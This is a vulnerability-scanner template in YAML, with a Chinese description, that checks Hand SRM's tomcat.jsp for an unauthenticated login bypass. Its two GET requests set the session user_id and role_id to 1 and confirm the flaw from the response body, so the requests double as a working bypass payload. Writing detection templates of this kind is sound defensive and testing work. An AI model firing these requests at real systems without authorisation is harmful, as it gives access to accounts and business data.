id: hand-tomcat-unauthorized
info:
  name: 汉得 SRM tomcat.jsp - 未授权访问漏洞
  author: EASY
  severity: high
  description: |
    该模板用于检测 汉得 SRM tomcat.jsp - 未授权访问漏洞。该类漏洞通常源于认证、授权或流程校验不足，使攻击者无需合法权限即可访问敏感功能。模板主要向 `/tomcat.jsp?dataName=user_id&dataValue=1`、`/tomcat.jsp?dataName=role_id&dataValue=1` 等路径发送探测请求，并根据状态码、响应头、页面关键字或时间差等证据确认漏洞是否存在。
  impact: |
    - 攻击者可绕过身份认证或未授权访问敏感接口，获取管理功能、重置密码或操作业务数据。
    - 若接口涉及账号、配置或文件操作，可能造成权限提升、数据泄露和业务被篡改。
  remediation: |
    - 修复认证与授权校验逻辑，确保每个敏感接口都执行服务端权限判断。
    - 升级受影响版本，并限制管理接口仅允许可信来源访问。
    - 复核近期账号变更、密码重置、配置修改和异常访问记录。
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E6%B1%89%E5%BE%97/%E6%B1%89%E5%BE%97SRM%20tomcat.jsp%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 2
    vendor: hand
    product: srm
  tags: unauth,vuln,hand,tomcat
flow: http(1) && http(2)
http:
  - method: GET
    path:
      - '{{BaseURL}}/tomcat.jsp?dataName=user_id&dataValue=1'
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "SRM SERVER Info") && contains(body, "user_id =")'
  - method: GET
    path:
      - '{{BaseURL}}/tomcat.jsp?dataName=role_id&dataValue=1'
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "SRM SERVER Info") && contains(body, "role_id =")'
